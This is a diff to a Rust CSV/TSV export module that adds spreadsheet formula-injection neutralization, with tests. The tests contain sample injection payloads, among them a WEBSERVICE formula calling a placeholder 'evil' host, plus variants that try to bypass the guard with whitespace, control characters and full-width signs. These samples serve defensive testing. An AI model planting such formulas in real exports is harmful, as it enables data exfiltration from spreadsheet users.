@@ -1,3 +1,5 @@
+// SPDX-License-Identifier: Apache-2.0
+// Formula guard adapted from t8y2/dbx 6f05afc0e.
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
 use std::fmt;
@@ -28,8 +30,57 @@ pub struct TableCsvExportOptions {
     pub timeout_secs: Option<u64>,
 }
 
+/// Spreadsheet formula injection protection: prefix hazardous text with an
+/// apostrophe, within the CSV/TSV field's surrounding quotes. This deliberately
+/// changes those text fields in spreadsheet exports; SQL/JSON remain untouched.
+/// JSON Number values (including negatives) bypass the text guard.
+///
+/// 前缀的写入/剥离必须保持每单元格一次的对称对：[`push_formula_guard`] 与
+/// [`strip_formula_guard`]。guard 绝不能放进 [`push_csv_escaped_content`] 这类
+/// 片段级写入路径——serde_json 的 `Display` 会把对象/数组拆成多个片段经
+/// `CsvEscapedWriter` 逐段写入，片段级 guard 会在 JSON 单元格中间插 `'`。
+/// Detect hazardous prefixes after whitespace/BOM characters that spreadsheet
+/// importers may ignore. Leading control characters are guarded, not skipped.
+pub fn needs_formula_guard(value: &str) -> bool {
+    value
+        .chars()
+        .find(|ch| !matches!(ch, '\u{feff}' | '\u{200b}') && (!ch.is_whitespace() || ch.is_control()))
+        .is_some_and(|ch| ch.is_control() || matches!(ch, '=' | '+' | '-' | '@' | '＝' | '＋' | '－' | '＠'))
+}
+
+/// 在单元格值开头写入公式中和前缀，每单元格调用一次：
+/// - 命中 [`needs_formula_guard`] 的文本前置 `'`；
+/// - 以 `'` 开头且其后仍需中和（或本身以 `''` 开头）的文本前置一个额外 `'`
+///   转义字面撇号，使 [`strip_formula_guard`] 的剥离成为无歧义逆操作——
+///   Literal `'+8613800000000` becomes `''+86…`; the paired inverse restores it.
+pub fn push_formula_guard(out: &mut String, value: &str) {
+    if value.as_bytes().first() == Some(&b'\'') {
+        if value.as_bytes().get(1) == Some(&b'\'') || needs_formula_guard(&value[1..]) {
+            out.push('\'');
+        }
+    } else if needs_formula_guard(value) {
+        out.push('\'');
+    }
+}
+
+/// [`push_formula_guard`] 的逆操作：单元格以 `'` 开头且其后命中中和条件（字面
+/// 撇号转义的 `''`，或 `'<触发字符>` / `' <触发字符>` 守卫）时剥掉一个 `'`，
+/// 否则原样返回——单独的 `'` 是用户数据，不动。
+/// Only use for cells known to have been encoded by push_formula_guard. Ordinary
+/// CSV imports are not changed, and must not guess that an apostrophe is a guard.
+pub fn strip_formula_guard(value: &str) -> &str {
+    let guarded = value.as_bytes().first() == Some(&b'\'')
+        && (value.as_bytes().get(1) == Some(&b'\'') || needs_formula_guard(&value[1..]));
+    if guarded {
+        &value[1..]
+    } else {
+        value
+    }
+}
+
 /// CSV 转义直写目标 buffer：包引号 + 内部 `"` 翻倍。值不含 `"` 时整段拷贝，
 /// 不做 replace 分配（逐批流式导出对每个单元格调用，是导出热路径）。
+/// 这里是纯转义原语，不含公式中和——guard 属于单元格级语义（见 [`push_formula_guard`]）。
 fn push_csv_escaped_content(out: &mut String, value: &str) {
     let mut rest = value;
     while let Some(pos) = rest.find('"') {
@@ -40,8 +91,18 @@ fn push_csv_escaped_content(out: &mut String, value: &str) {
     out.push_str(rest);
 }
 
-pub(crate) fn push_csv_escaped(out: &mut String, value: &str) {
+#[cfg(test)]
+fn push_csv_escaped(out: &mut String, value: &str) {
     out.push('"');
+    push_csv_escaped_content(out, value);
+    out.push('"');
+}
+
+/// 写入带引号的 CSV 单元格并进行公式中和与转义。
+/// 守卫前缀写在引号内：`"'-total"` 是合法的带引号字段，`'"-total"'` 不是。
+pub fn push_csv_field(out: &mut String, value: &str) {
+    out.push('"');
+    push_formula_guard(out, value);
     push_csv_escaped_content(out, value);
     out.push('"');
 }
@@ -60,7 +121,10 @@ pub(crate) fn push_csv_text_value(out: &mut String, value: &Value) {
     out.push('"');
     match value {
         Value::Null => {}
-        Value::String(value) => push_csv_escaped_content(out, value),
+        Value::String(value) => {
+            push_formula_guard(out, value);
+            push_csv_escaped_content(out, value);
+        }
         Value::Bool(value) => out.push_str(if *value { "true" } else { "false" }),
         Value::Number(value) => {
             fmt::write(out, format_args!("{value}")).expect("writing a number into a String cannot fail")
@@ -79,11 +143,15 @@ fn push_csv_value(out: &mut String, value: &Value) {
     push_csv_text_value(out, value);
 }
 
-/// TSV 转义直写：仅含特殊字符时包引号（语义与原 escape_tsv 一致）。
+/// TSV 转义直写：仅含特殊字符时包引号（语义与原 escape_tsv 一致），守卫前缀在引号内。
 fn push_tsv_escaped(out: &mut String, value: &str) {
     if value.contains('\t') || value.contains('\n') || value.contains('\r') || value.contains('"') {
-        push_csv_escaped(out, value);
+        out.push('"');
+        push_formula_guard(out, value);
+        push_csv_escaped_content(out, value);
+        out.push('"');
     } else {
+        push_formula_guard(out, value);
         out.push_str(value);
     }
 }
@@ -109,7 +177,8 @@ pub(crate) fn estimated_rows_capacity(rows: &[Vec<Value>]) -> usize {
     cells.saturating_mul(12).min(ROWS_CAPACITY_ESTIMATE_MAX)
 }
 
-pub(crate) fn escape_csv(value: &str) -> String {
+#[cfg(test)]
+fn escape_csv(value: &str) -> String {
     let mut out = String::with_capacity(value.len() + 2);
     push_csv_escaped(&mut out, value);
     out
@@ -194,7 +263,7 @@ fn format_csv_with_value_formatter(columns: &[String], rows: &[Vec<Value>]) -> S
         if index > 0 {
             out.push(',');
         }
-        push_csv_escaped(&mut out, column);
+        push_csv_field(&mut out, column);
     }
     out.push('\n');
     push_query_result_csv_rows(&mut out, rows);
@@ -211,12 +280,15 @@ pub fn format_query_result_csv(columns: &[String], rows: &[Vec<Value>]) -> Strin
 
 fn write_csv_text_row(writer: &mut impl Write, values: impl IntoIterator<Item = String>) -> Result<(), String> {
     let mut first = true;
+    let mut cell = String::new();
     for value in values {
         if !first {
             writer.write_all(b",").map_err(|err| err.to_string())?;
         }
         first = false;
-        writer.write_all(escape_csv(&value).as_bytes()).map_err(|err| err.to_string())?;
+        cell.clear();
+        push_csv_field(&mut cell, &value);
+        writer.write_all(cell.as_bytes()).map_err(|err| err.to_string())?;
     }
     Ok(())
 }
@@ -363,14 +435,225 @@ mod tests {
     fn escape_tsv_matches_reference_semantics() {
         // TSV 仅在含 \t/\n/\r/引号时包引号；逗号不触发
         for input in ["", "plain", "with,comma", "tab\there", "line\nbreak", "cr\rhere", "quo\"te", "\t\"mix\""] {
+            // 公式中和前缀与转义正交：守卫由共享原语计算，无论是否包引号都带前缀
+            let mut guard = String::new();
+            super::push_formula_guard(&mut guard, input);
             let expected =
                 if input.contains('\t') || input.contains('\n') || input.contains('\r') || input.contains('"') {
-                    format!("\"{}\"", input.replace('"', "\"\""))
+                    format!("\"{guard}{}\"", input.replace('"', "\"\""))
                 } else {
-                    input.to_string()
+                    format!("{guard}{input}")
                 };
             assert_eq!(super::escape_tsv(input), expected, "input: {input:?}");
         }
+    }
+
+    #[test]
+    fn formula_like_text_cells_are_neutralized() {
+        let out = format_csv(
+            &["cmd".to_string()],
+            &[
+                vec![json!("=WEBSERVICE(\"https://evil\")")],
+                vec![json!("+2")],
+                vec![json!("-3")],
+                vec![json!("@x")],
+                vec![json!("\tlead")],
+                vec![json!("safe")],
+                vec![json!(-4)],
+            ],
+        );
+        assert_eq!(
+            out,
+            "\"cmd\"\n\"'=WEBSERVICE(\"\"https://evil\"\")\"\n\"'+2\"\n\"'-3\"\n\"'@x\"\n\"'\tlead\"\n\"safe\"\n\"-4\""
+        );
+    }
+
+    #[test]
+    fn formula_guard_covers_tsv_and_plain_cells() {
+        let tsv = format_tsv(
+            &["v".to_string()],
+            &[
+                vec![json!("=sum")],
+                vec![json!("plain")],
+                vec![json!(-42)],
+                vec![json!("-42")],
+                vec![json!("+86")],
+                vec![json!("@mention")],
+                vec![json!("safe=safe")],
+            ],
+        );
+        assert_eq!(tsv, "v\n'=sum\nplain\n-42\n'-42\n'+86\n'@mention\nsafe=safe");
+    }
+
+    #[test]
+    fn formula_guard_covers_headers() {
+        let out = format_csv(&["-total".to_string(), "=calc".to_string()], &[vec![json!(1), json!(2)]]);
+        assert_eq!(out, "\"'-total\",\"'=calc\"\n\"1\",\"2\"");
+        let tsv = format_tsv(&["-total".to_string(), "+metric".to_string()], &[vec![json!(1), json!(2)]]);
+        assert_eq!(tsv, "'-total\t'+metric\n1\t2");
+    }
+
+    #[test]
+    fn json_cells_are_exported_verbatim_and_strings_still_guarded() {
+        let out = format_csv(
+            &["v".to_string()],
+            &[
+                vec![json!({"n": -5})],
+                vec![json!([1, -2])],
+                vec![json!(["-5"])],
+                vec![json!({"formula": "=1+1"})],
+                vec![json!("-5")],
+            ],
+        );
+        assert_eq!(
+            out,
+            concat!(
+                "\"v\"\n",
+                "\"{\"\"n\"\":-5}\"\n",
+                "\"[1,-2]\"\n",
+                "\"[\"\"-5\"\"]\"\n",
+                "\"{\"\"formula\"\":\"\"=1+1\"\"}\"\n",
+                "\"'-5\""
+            )
+        );
+    }
+
+    #[test]
+    fn formula_guard_escapes_literal_leading_apostrophe_for_symmetric_round_trip() {
+        let out = format_csv(
+            &["v".to_string()],
+            &[
+                vec![json!("'+8613800000000")],
+                vec![json!("''-already-doubled")],
+                vec![json!("'plain")],
+                vec![json!(" =cmd")],
+                vec![json!("  -note")],
+                vec![json!("' =spaced")],
+            ],
+        );
+        assert_eq!(
+            out,
+            concat!(
+                "\"v\"\n",
+                "\"''+8613800000000\"\n",
+                "\"'''-already-doubled\"\n",
+                "\"'plain\"\n",
+                "\"' =cmd\"\n",
+                "\"'  -note\"\n",
+                "\"'' =spaced\""
+            )
+        );
+    }
+
+    #[test]
+    fn formula_guard_strip_is_the_exact_inverse_of_push() {
+        for value in [
+            "=cmd",
+            " =cmd",
+            "  -x",
+            "+2",
+            "-3",
+            "@a",
+            "\tx",
+            "\rx",
+            "\t=cmd",
+            "\r=cmd",
+            " \t=cmd",
+            " \r=cmd",
+            "\r\n=cmd",
+            "'+86",
+            "''-e",
+            "' =spaced",
+            "'",
+            "''",
+            "'''",
+            "'plain",
+            "plain",
+            "",
+        ] {
+            let mut guarded = String::new();
+            super::push_formula_guard(&mut guarded, value);
+            let cell = format!("{guarded}{value}");
+            assert_eq!(super::strip_formula_guard(&cell), value, "value: {value:?}");
+        }
+        assert_eq!(super::strip_formula_guard("plain"), "plain");
+        assert_eq!(super::strip_formula_guard("'"), "'");
+    }
+
+    #[test]
+    fn tab_cr_prefix_and_whitespace_threat_cases_do_not_bypass() {
+        // Tab / CR 作为前缀绝不会绕过中和检查
+        for input in [
+            "\t=cmd",
+            "\r=cmd",
+            "\t+cmd",
+            "\r-cmd",
+            "\t@cmd",
+            "\tcmd",
+            "\rcmd",
+            " \t=cmd",
+            " \r=cmd",
+            "\t =cmd",
+            "\r =cmd",
+            "\r\n=cmd",
+            "   =1+1",
+            "  +calc",
+            " -note",
+            "  @exec",
+            "\t",
+            "\r",
+            "\t\t-calc",
+            "\n=cmd",
+            " \n=cmd",
+            "\0=cmd",
+            "\u{7}=cmd",
+            "\u{b}=cmd",
+            "\u{feff}=cmd",
+            "\u{200b}=cmd",
+            "\u{a0}=cmd",
+            "\u{3000}+cmd",
+            "＝SUM(A1)",
+            "＋cmd",
+            "－cmd",
+            "＠cmd",
+        ] {
+            assert!(super::needs_formula_guard(input), "should be guarded: {input:?}");
+        }
+
+        // 无害字符串与中间包含触发字符的文本不触发中和
+        for input in [
+            "hello",
+            "user@example.com",
+            "a+b",
+            "a-b",
+            "x=y",
+            "  safe with space",
+            "12345",
+            "",
+            " ",
+            "   ",
+            "'",
+            "'harmless",
+        ] {
+            assert!(!super::needs_formula_guard(input), "should NOT be guarded: {input:?}");
+        }
+    }
+
+    #[test]
+    fn rfc4180_quoting_delimiters_and_newlines_preserved() {
+        let out = format_csv(
+            &["formula_with_comma".to_string(), "formula_with_quotes".to_string(), "formula_with_newline".to_string()],
+            &[vec![json!("=A1,B1"), json!("=IF(A1=\"yes\",1,0)"), json!("=SUM(\nA1:A10\n)")]],
+        );
+        assert_eq!(
+            out,
+            concat!(
+                "\"formula_with_comma\",\"formula_with_quotes\",\"formula_with_newline\"\n",
+                "\"'=A1,B1\",\"'=IF(A1=\"\"yes\"\",1,0)\",\"'=SUM(\n",
+                "A1:A10\n",
+                ")\""
+            )
+        );
     }
 
     #[test]
